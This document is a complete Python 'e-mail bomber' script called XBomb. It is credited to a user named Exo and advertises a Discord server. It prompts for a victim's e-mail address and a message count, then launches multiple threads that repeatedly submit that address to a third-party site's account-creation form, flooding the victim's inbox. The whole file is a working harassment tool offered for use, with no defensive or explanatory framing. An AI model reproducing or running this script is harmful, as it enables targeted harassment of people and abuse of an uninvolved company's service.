'''
XBomb Created by Exo
Check out BHU: https://discord.gg/2Utj3prC
Thanks for using XBomb!
'''
import requests
from time import sleep
from colorama import init
from os import name,system
import threading

init(autoreset=True)

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

class color():
        ugreen = '\033[92m'
        magenta = '\033[35m'
        uwhite = '\033[97m'
        ured = '\033[91m'
        umagenta = '\033[95m'
        ublue = '\033[94m'

clear()

print(f'''

{color.umagenta}__   __ {color.ublue}______                 _     
{color.umagenta}\ \ / / {color.ublue}| ___ \               | |    
{color.umagenta} \ V /  {color.ublue}| |_/ / ___  _ __ ___ | |__  
{color.umagenta} /   \  {color.ublue}| ___ \/ _ \| '_ ` _ \| '_ \ 
{color.umagenta}/ /^\ \ {color.ublue}| |_/ / (_) | | | | | | |_) |
{color.umagenta}\/   \/ {color.ublue}\____/ \___/|_| |_| |_|_.__/ 
            {color.ugreen}Made by: Exo
                                    
''')

ind = input(f"{color.uwhite}Enter E-Mail Address: ")
num = int(input(f"{color.uwhite}Number Of E-Mails to send: "))
xdx = int(input("Enter number of threads: "))

data = {'process':1,
        'emailaddress':'',
        'email':ind}

def main():
    for xyz in range(num):
        try:
            r = requests.post(url = "https://xojo.com/account/create/", data = data)
            print(f"{color.ugreen}Request: OK")
        except Exception:
            print(f"{color.ured}Request: FAILED!")
    print("Done!")

for zet in range(xdx):
    threading.Thread(target=main).start()
